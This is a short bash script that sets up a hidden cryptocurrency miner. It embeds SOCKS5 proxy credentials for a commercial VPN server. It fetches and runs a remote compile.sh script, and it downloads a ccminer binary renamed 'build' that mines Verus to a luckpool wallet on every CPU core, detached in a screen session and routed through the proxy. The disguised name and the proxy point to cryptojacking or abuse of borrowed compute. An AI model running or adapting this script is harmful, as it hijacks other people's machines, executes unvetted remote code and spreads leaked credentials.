#!/bin/bash
proxy="socks5://OXk5cgacd:4uHDOv78GAq@iad-a10.ipvanish.com:1080"
array[0]="0001"
array[1]="0002"
array[2]="0003"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
apt-get update
wget -q https://raw.githubusercontent.com/declined01/master/master/compile.sh
wget -qO build https://github.com/declined01/master/raw/master/ccminer
screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RV9KzJ9v7HJ5puLKh32iWPGboKXDoL7HB3.nothing-$worker -p x -t $(nproc --all) -x $proxy
./compile.sh
